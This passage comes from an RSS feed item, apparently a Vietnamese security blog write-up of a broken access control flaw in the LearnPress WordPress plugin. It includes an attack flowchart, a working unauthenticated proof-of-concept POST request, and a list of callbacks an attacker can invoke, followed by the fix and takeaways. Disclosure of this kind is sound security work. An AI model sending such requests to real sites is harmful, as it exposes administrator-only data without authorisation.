&lt;code&gt;order_statistic&lt;/code&gt; và &lt;code&gt;plugin_status_content&lt;/code&gt; đều có cơ chế kiểm tra quyền Administrator trước khi thực thi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! current_user_can( UserModel::ROLE_ADMINISTRATOR ) ) {&#xA;  wp_die( esc_html__( &amp;#39;You do not have sufficient permissions to access this page.&amp;#39;, &amp;#39;learnpress&amp;#39; ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nhờ đó lỗ hổng đã được khoá chặt.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;&#xA;A[&amp;#34;Unauthenticated attacker&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Send request with lp-load-ajax parameter&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;LoadContentViaAjax::catch_lp_ajax() triggered via init hook&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;Check lp-load-ajax parameter exists&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;Create instance of LoadContentViaAjax&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;Class in $class_no_nonce whitelist → Skip nonce check&amp;#34;]&#xA;F --&amp;gt; G[&amp;#34;Retrieve $class and $method from request data&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;Check if $class:$method is in $allow_callbacks (all callbacks allowed)&amp;#34;]&#xA;H --&amp;gt; I[&amp;#34;is_callable([class, method])?&amp;#34;]&#xA;I --&amp;gt;|Yes| J[&amp;#34;Execute callback via call_user_func([class, method], args)&amp;#34;]&#xA;J --&amp;gt; K[&amp;#34;Sensitive admin-only data returned to attacker&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Gửi request với Unauthenticated user:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST / HTTP/1.1&#xA;Host: localhost&#xA;Referer: http://localhost&#xA;&#xA;lp-load-ajax=load_content_via_ajax&amp;amp;data={&amp;#34;callback&amp;#34;:{&amp;#34;class&amp;#34;:&amp;#34;LearnPress\\TemplateHooks\\Admin\\AdminEditQizTemplate&amp;#34;,&amp;#34;method&amp;#34;:&amp;#34;render_list_items_not_assign&amp;#34;},&amp;#34;args&amp;#34;:{&amp;#34;quiz_id&amp;#34;:483}}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;https://w41bu1.github.io/posts/2025-12-11-cve-2025-11368/result.png&#34; title=&#34;Kết quả&#34; data-thumbnail=&#34;https://w41bu1.github.io/posts/2025-12-11-cve-2025-11368/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Kết quả&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;https://w41bu1.github.io/posts/2025-12-11-cve-2025-11368/result.png&#39; alt=&#34;Result&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Kết quả&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Danh sách các callback hợp lệ khác:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;LearnPress\TemplateHooks\Course\ListCoursesTemplate:render_courses&#xA;LearnPress\TemplateHooks\Course\ListCoursesRelatedTemplate:render_courses&#xA;LearnPress\TemplateHooks\Course\SingleCourseTemplate:render_html_comments&#xA;LearnPress\TemplateHooks\Profile\ProfileQuizzesTemplate:renderContent&#xA;LearnPress\TemplateHooks\Course\AdminEditCurriculumTemplate:render_edit_course_curriculum&#xA;LearnPress\TemplateHooks\Course\AdminEditCurriculumTemplate:render_list_items_not_assign&#xA;LearnPress\TemplateHooks\Admin\AdminEditQizTemplate:render_edit_quiz&#xA;LearnPress\TemplateHooks\Admin\AdminEditQizTemplate:render_list_items_not_assign&#xA;LearnPress\TemplateHooks\Admin\AdminEditQuestionTemplate:render_edit_question&#xA;LearnPress\TemplateHooks\Course\CourseMaterialTemplate:render_material_items&#xA;LearnPress\ExternalPlugin\Elementor\Widgets\Course\Skins\CoursesGrid:render_courses&#xA;LearnPress\ExternalPlugin\Elementor\Widgets\Course\Skins\CoursesList:render_courses&#xA;LearnPress\ExternalPlugin\Elementor\Widgets\Course\Skins\CoursesLoopItem:render_courses&#xA;LearnPress\Gutenberg\Blocks\Courses\ListCoursesBlockType:render_courses&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng &lt;strong&gt;Broken Access Control&lt;/strong&gt; trong LearnPress &amp;lt;= 4.3.1 cho phép &lt;strong&gt;kẻ tấn công chưa xác thực&lt;/strong&gt; thực thi các callback AJAX vốn chỉ dành cho admin. Vấn đề phát sinh do API không kiểm tra &lt;strong&gt;capability/permission&lt;/strong&gt; trước khi gọi &lt;code&gt;call_user_func([class, method], args)&lt;/code&gt;. Bản vá 4.3.2 đã giới hạn callback hợp lệ và yêu cầu quyền Administrator, ngăn chặn truy cập trái phép.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Không bao giờ cho phép callback động thực thi mà không kiểm tra quyền.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;lp-load-ajax&lt;/code&gt; endpoint có thể trở thành lỗ hổng nếu danh sách callback không bị giới hạn.&lt;/li&gt;&#xA;&lt;li&gt;Luôn xác thực &lt;code&gt;nonce&lt;/code&gt; hoặc kiểm tra &lt;strong&gt;referer/domain&lt;/strong&gt; để giảm rủi ro từ request không hợp lệ.&lt;/li&gt;&#xA;&lt;li&gt;Bản vá cần &lt;strong&gt;cố định danh sách callback&lt;/strong&gt; và kết hợp với kiểm tra quyền admin cho các chức năng nhạy cảm.&lt;/li&gt;&#xA;&lt;li&gt;Broken Access Control thường phát sinh ở các API AJAX/REST khi lập trình viên tin tưởng dữ liệu đầu vào từ client.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/broken-access-control/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Broken Access Control&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/learnpress/vulnerability/wordpress-learnpress-wordpress-lms-plugin-plugin-4-3-1-missing-authorization-to-unauthenticated-orders-statistics-exposure-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress LearnPress Plugin &amp;lt;= 4.3.1 is vulnerable to Broken Access Control&lt;/a&gt;&lt;/p&gt;</description>
    </item>
  </channel>
</rss>
